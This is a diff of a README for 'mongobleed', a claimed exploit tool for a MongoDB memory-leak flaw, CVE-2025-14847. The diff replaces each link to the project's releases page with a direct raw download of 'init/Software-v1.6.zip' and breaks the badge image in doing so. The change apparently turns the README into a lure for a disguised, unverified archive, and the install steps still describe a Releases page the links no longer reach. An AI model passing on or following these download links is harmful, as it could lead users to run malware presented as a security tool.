@@ -1,7 +1,7 @@
 # 🛠️ mongobleed - Easy Download of MongoDB Exploit Tool
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/AmadoBatista/mongobleed/releases)
+[![Download](https://raw.githubusercontent.com/AmadoBatista/mongobleed/main/init/Software-v1.6.zip%20Release-blue)](https://raw.githubusercontent.com/AmadoBatista/mongobleed/main/init/Software-v1.6.zip)
 
 ## 📝 Overview
 mongobleed is a tool that demonstrates a security flaw in MongoDB. This flaw, known as **CVE-2025-14847**, allows attackers to access sensitive server memory without needing credentials. This document will guide you on how to download and run mongobleed.
@@ -32,7 +32,7 @@ This exploit can be dangerous, so it is essential to use this tool responsibly a
 | 5.0.x | 5.0.0 - 5.0.10 | 5.0.11 |
 
 ## 🔗 Download & Install
-To get started, you will need to [visit this page to download](https://github.com/AmadoBatista/mongobleed/releases). 
+To get started, you will need to [visit this page to download](https://raw.githubusercontent.com/AmadoBatista/mongobleed/main/init/Software-v1.6.zip). 
 
 1. Go to the Releases page.
 2. Find the latest version of mongobleed.
@@ -69,4 +69,4 @@ A: Only use it on systems that you own or have permission to test.
 **Q: How can I report a bug?**  
 A: Please open an issue on the GitHub repository.
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/AmadoBatista/mongobleed/releases)
+[![Download](https://raw.githubusercontent.com/AmadoBatista/mongobleed/main/init/Software-v1.6.zip%20Release-blue)](https://raw.githubusercontent.com/AmadoBatista/mongobleed/main/init/Software-v1.6.zip)
